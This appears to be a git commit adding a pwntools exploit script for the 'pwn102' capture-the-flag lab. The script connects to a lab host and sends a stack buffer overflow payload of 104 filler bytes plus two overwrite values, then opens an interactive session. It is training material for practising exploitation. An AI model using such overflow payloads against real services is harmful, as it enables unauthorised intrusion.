187ce1a9354b9d7c9aa49a6e57a0ca5b25c4a7e2
Theory <51336409+igepaul8@users.noreply.github.com>
2023-03-26 20:02:44 -0400

    Thm pwn102
    Thm pwn102

---
+++ pwn102.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './pwn102.pwn102'
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return remote('10.10.213.81', 9002)
+        #return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start()
+payload = b'A'*104 + p32(0xc0d3) + p32(0xc0ff33)
+io.recvuntil('?')
+io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+
+io.interactive()
+
